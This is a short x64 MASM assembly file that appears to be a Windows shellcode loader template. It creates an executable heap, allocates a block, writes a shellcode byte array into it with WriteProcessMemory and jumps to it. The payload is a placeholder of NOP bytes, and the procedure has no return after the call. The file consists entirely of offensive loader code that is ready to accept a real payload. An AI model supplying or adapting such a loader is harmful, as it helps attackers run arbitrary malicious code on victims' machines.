; windows_loader64bits_heapcreate.asm

extrn HeapCreate :PROC
extrn HeapAlloc :PROC
extrn GetCurrentProcess :PROC
extrn WriteProcessMemory :PROC

.data
    shellcode   DB 90h, 90h, 90h, 90h, 90h, 0
    hProcess    DQ ?
    baseAddr    DQ ?
    hHeap       DQ ?

.code
Start PROC
    SUB     rsp, 28h

    MOV     rcx, 40000h
    MOV     rdx, 100h
    XOR     r8, r8
    CALL    HeapCreate
    MOV     hHeap, rax

    MOV     rcx, hHeap
    MOV     rdx, 8 ; HEAP_ZERO_MEMORY
    MOV     r8, SIZEOF shellcode
    CALL    HeapAlloc
    MOV     baseAddr, rax

    CALL    GetCurrentProcess
    MOV     hProcess, rax

    MOV     rcx, hProcess
    MOV     rdx, baseAddr
    LEA     r8, shellcode
    MOV     r9, SIZEOF shellcode
    SUB     rsp, 40
    MOV     qword ptr [rsp+32], 0
    CALL    WriteProcessMemory
    ADD     rsp, 40

    CALL    baseAddr

Start ENDP
END